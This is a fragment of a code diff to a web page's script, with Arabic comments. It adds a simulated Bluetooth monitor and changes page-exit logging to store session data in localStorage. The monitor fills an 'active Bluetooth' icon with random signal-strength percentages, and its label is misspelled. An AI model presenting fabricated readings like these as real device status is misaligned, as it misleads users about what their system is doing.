+        function startBluetoothMonitoring() {
+            // محاكاة مراقبة البلوتوث
+            setInterval(() => {
+                try {
+                    // تحديث أيقونة البلوتوث
+                    const icon = document.querySelector('.bluetooth-icon');
+                    if (icon) {
+                        const strength = Math.floor(Math.random() * 100);
+                        icon.textContent = `🟦 بلاعة نشط (${strength}%)`;
+                    }
+                } catch (e) {
+                    // تجاهل الأخطاء
+                }
+            }, 3000);
+        }
         
         // عند مغادرة الصفحة
         window.addEventListener('beforeunload', function() {
-            if (kelogSystem) {
-                kelogSystem.log('مغادرة الصفحة', {
-                    timeOnPage: performance.now(),
-                    url: window.location.href
-                });
-            }
+            // حفظ آخر نشاط
+            const lastActivity = {
+                type: 'session_end',
+                sessionId: sessionId,
+                timestamp: new Date().toISOString(),
+                timeSpent: Math.round(performance.now() / 1000)
+            };
+            
+            localStorage.setItem('last_session', JSON.stringify(lastActivity));
         });
     </script>
 </body>
